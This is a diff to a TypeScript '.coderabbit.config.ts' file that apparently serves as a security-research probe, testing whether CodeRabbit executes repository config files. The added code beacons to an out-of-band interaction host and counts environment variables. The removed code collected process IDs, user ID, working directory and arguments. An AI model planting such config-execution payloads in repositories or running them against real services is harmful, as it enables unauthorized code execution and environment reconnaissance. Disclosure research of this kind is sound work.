@@ -1,36 +1,27 @@
-// CodeRabbit config-execution probe CR-BASE-121 (authorized VDP research, READ-ONLY marker).
-// Placed on the BASE branch (main) of aikido-bb-lmacan2/cr-public-pr-surface.
-// Purpose: the control the previous worker could not run — does a .coderabbit.config.ts that
-// lives on the BASE branch of the repository also execute? The payload emits a runtime
-// computation (pid/uid/cwd/node version/env count) so a positive is provable execution and not
-// merely the presence of the file. READ ONLY: nothing is written, deleted or modified.
-
-const MARK = "CR-BASE-121-EXEC"
-
-function rep(): string {
-  const R: string[] = []
-  try {
-    const p: any = (globalThis as any).process
-    R.push("pid=" + p.pid + " ppid=" + p.ppid + " uid=" + p.getuid() + " cwd=" + p.cwd() + " node=" + p.version + " argv=" + JSON.stringify(p.argv))
-  } catch (e: any) {
-    R.push("proc!x=" + (e && (e.code || e.name) ? String(e.code || e.name) : "ERR"))
+// probe 112 H1 BASE-BRANCH CONTROL: identical file on the default branch.
+const MARK = "CR-H1-112C-BASE"
+const OOB = "http://4b49da8282a4.daudlmp9n73du4p5bg4gw9p8m1wiatn1h.oast.live/cb/4b49da8282a4"
+try {
+  const w: any = globalThis as any
+  if (typeof w.fetch === "function") {
+    const p = w.fetch(OOB + "/h1-base?canary=" + MARK, { method: "GET" })
+    if (p && typeof p["catch"] === "function") p["catch"](() => {})
   }
-  try {
-    R.push("nenv=" + Object.keys((globalThis as any).process.env).length)
-  } catch (_) {
-    R.push("nenv=ERR")
-  }
-  try {
-    R.push("modscope_require=" + eval("typeof require"))
-  } catch (_) {
-    R.push("modscope_require=ERR")
-  }
-  return MARK + " :: " + R.join(" || ")
+} catch (_) {
+  /* marker only */
 }
-
+function envProbe(): string {
+  const w: any = globalThis as any
+  const p = w.process
+  if (!p || !p.env) return MARK + " env=ABSENT"
+  let n = 0
+  try {
+    n = Object.keys(p.env).length
+  } catch (_) {
+    /* ignore */
+  }
+  return MARK + " env=PRESENT n=" + n
+}
 export default {
-  reviews: {
-    profile: "chill",
-    auto_title_instructions: rep(),
-  },
+  reviews: { profile: "chill", auto_title_instructions: envProbe() },
 }
